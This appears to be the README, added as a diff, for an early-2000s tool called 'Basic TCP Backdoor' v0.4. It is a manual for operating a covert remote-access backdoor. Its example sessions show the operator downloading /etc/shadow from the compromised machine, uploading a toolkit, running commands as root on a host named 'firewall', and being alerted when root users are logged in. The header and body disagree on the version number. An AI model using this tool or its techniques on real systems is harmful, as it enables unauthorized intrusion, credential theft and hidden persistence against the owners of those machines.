@@ -1,0 +1,126 @@
+ Basic TCP Backdoor v0.4 (10/10/02)
+
+ by detach (XT) - www.duho.org
+
+ Changes:
+ 
+ - File transfer!
+
+Here's version 0.3. It features FILE TRANSFER.
+
+Features:
+
+- File transfer
+- Local command execution
+- Unloading server
+- Warns when root is logged in
+
+File transfer:
+
+The program is able to up- and download files in active mode. Which means that
+listening socket is on the client's side for file transfer. This means the
+server is doing an incoming connection on a port you specify, so you need to
+make sure you don't have a firewall that blocks this, else you need to NAT it
+through.
+In the next release I will enable passive file transfers, which means the server
+side will open a port and you can use an outgoing connection on the client side.
+
+If you want to transfer a file you first need to specify the port to use, this
+is done with the command ";xfer set". It will ask you if you want to toggle the
+mode between active and passive mode. Right now it will refuse to change to
+passive mode as you know. After that you specify the local port to use. This
+information is preserved during the session, so it only has to be done once.
+
+Example:
+
+----------
+;xfer set
+Current settings:
+Mode: Active
+Port: 0
+
+Toggle mode? (y/n) n
+Port: 5000
+----------
+
+Now that your port is known, you can exchange files. The file names need to
+be specified with the FULL PATH TO THE FILE! That's for the moment, in the
+next release I hope to have improved that.
+There's no progress bar yet, that's also for the next release.
+
+You use the command ";xfer get" or ";xfer put".
+
+Example:
+
+----------
+;xfer get
+Remote file: /etc/shadow
+Local file: /tmp/shadow
+Waiting for incoming connection... connected.
+DONE!
+
+----------
+
+To upload a file:
+
+----------
+;xfer put
+Local file: /home/detach/toolkit.tar.gz
+Remote file: /tmp/t.tgz
+Waiting for incoming connection... connected.
+DONE!
+
+----------
+
+Got it?
+
+Local command execution:
+
+You can execute a command local or remote. Normally it executes remote,
+but when your command starts with a semicolon it will execute on the client
+side (usually your term). This is a nice feature for if you need to quickly
+find out something on your computer. You could also do ";sh" and you have a
+local shell and go back with a simple "exit".
+
+Example:
+
+----------
+;hostname
+localhost
+
+hostname
+firewall
+
+;bash
+user@host:~/projects/BBD-0.4$ exit
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+exit
+----------
+
+Unloading server:
+
+Type:
+
+unload
+
+Warning about logged in users:
+
+----------
+$ ./bbd_cl -h fuckit -p 3846
+Basic TCP Backdoor client
+By detach [DUHO] <http://www.duho.org/>
+
+Connecting... connected.
+Passcode: hard
+
+At Your Service! ;^}
+
+Caution> root is logged in on tty1!
+Caution> root is logged in on tty2!
+-> 2 user(s) logged in, 2 root login(s)
+
+----------
+
+Next, read INSTALL file.
